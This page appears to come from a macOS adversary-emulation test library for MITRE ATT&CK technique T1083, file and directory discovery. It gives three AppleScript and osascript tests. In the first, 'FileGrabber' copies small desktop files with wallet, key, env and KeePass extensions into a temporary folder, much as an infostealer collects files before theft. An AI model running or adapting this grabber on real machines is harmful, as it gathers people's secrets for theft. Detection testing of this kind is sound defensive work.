---
title: T1083
description: "File and Directory Discovery"
---

## Description from ATT&CK



Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)

Some files and directories may require elevated or specific user permissions to access.


## Tests

### Test #1 - Copy files from desktop

FileGrabber grabs files from desktop and copies them to a temporary folder

**Input Arguments:**

| Argument | Type | Default Value |
|----------|------|---------------|
| destinationPath | str | `/tmp/FileGrabber` |


```applescript tab="<Code /> Script"
set fileGrabberFolderPath to "/tmp/FileGrabber"
set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key", "env", "md", "kdbx"}

try
 	set desktopFiles to every file of desktop
 	repeat with aFile in desktopFiles
  		try
 			  set fileExtension to name extension of aFile
   			if fileExtension is in extensionsList then
  				set fileSize to size of aFile
  				if fileSize < 51200 then
   					set destinationFolder to (POSIX file fileGrabberFolderPath) as alias
   					duplicate aFile to destinationFolder with replacing
  				end if
   			end if
  		end try
 	end repeat
end try

```


```bash tab="<Terminal /> Execution"
# Execute with default arguments
osascript -e 'set fileGrabberFolderPath to "/tmp/FileGrabber"' -e 'set extensionsList to {"txt", "docx", "rtf", "doc", "wallet", "keys", "key", "env", "md", "kdbx"}' -e 'try' -e 'set desktopFiles to every file of desktop' -e 'repeat with aFile in desktopFiles' -e 'try' -e 'set fileExtension to name extension of aFile' -e 'if fileExtension is in extensionsList then' -e 'set fileSize to size of aFile' -e 'if fileSize < 51200 then' -e 'set destinationFolder to (POSIX file fileGrabberFolderPath) as alias' -e 'duplicate aFile to destinationFolder with replacing' -e 'end if' -e 'end if' -e 'end try' -e 'end repeat' -e 'end try'

# Or save to file and execute
osascript copy_files_from_desktop.scpt

# With custom arguments
osascript copy_files_from_desktop.scpt "/tmp/FileGrabber"
```

**Download Files**

<DownloadButton filename="copy_files_from_desktop.scpt" type="scpt" label="Download .scpt" />
<DownloadButton filename="copy_files_from_desktop.swift" type="swift" label="Download .swift" />
<DownloadButton filename="copy_files_from_desktop" type="binary" label="Download Binary" />
<DownloadButton filename="copy_files_from_desktop.app" type="app" label="Download Application Bundle" />

---

### Test #2 - List files and directories in Macintosh HD

Enumerate files and directories in the root filesystem using Finder application via AppleScript

<span className="inline-flex items-center rounded-md bg-yellow-50 px-2 py-1 text-xs font-normal text-yellow-800 ring-1 ring-yellow-600/20 ring-inset">⚠️ TCC Required</span>

**Input Arguments:**

| Argument | Type | Default Value |
|----------|------|---------------|
| folderName | str | `/` |


```applescript tab="<Code /> Script"
tell application "Finder" to get name of every item of folder POSIX file "/"

```


```bash tab="<Terminal /> Execution"
# Execute with default arguments
osascript -e 'tell application "Finder" to get name of every item of folder POSIX file "/"'

# Or save to file and execute
osascript list_files_and_directories_in_macintosh_hd.scpt

# With custom arguments
osascript list_files_and_directories_in_macintosh_hd.scpt "/"
```

**Download Files**

<DownloadButton filename="list_files_and_directories_in_macintosh_hd.scpt" type="scpt" label="Download .scpt" />
<DownloadButton filename="list_files_and_directories_in_macintosh_hd.swift" type="swift" label="Download .swift" />
<DownloadButton filename="list_files_and_directories_in_macintosh_hd" type="binary" label="Download Binary" />
<DownloadButton filename="list_files_and_directories_in_macintosh_hd.app" type="app" label="Download Application Bundle" />

---

### Test #3 - List files and directories in root directory

Perform directory listing of root filesystem using AppleScript list folder command

**Input Arguments:**

| Argument | Type | Default Value |
|----------|------|---------------|
| folderName | str | `/` |


```applescript tab="<Code /> Script"
list folder "/"

```


```bash tab="<Terminal /> Execution"
# Execute with default arguments
osascript -e 'list folder "/"'

# Or save to file and execute
osascript list_files_and_directories_in_root_directory.scpt

# With custom arguments
osascript list_files_and_directories_in_root_directory.scpt "/"
```

**Download Files**

<DownloadButton filename="list_files_and_directories_in_root_directory.scpt" type="scpt" label="Download .scpt" />
<DownloadButton filename="list_files_and_directories_in_root_directory.swift" type="swift" label="Download .swift" />
<DownloadButton filename="list_files_and_directories_in_root_directory" type="binary" label="Download Binary" />
<DownloadButton filename="list_files_and_directories_in_root_directory.app" type="app" label="Download Application Bundle" />

## References

- [MITRE ATT&CK T1083](https://attack.mitre.org/techniques/T1083/)
- [Apple Script Language Guide](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
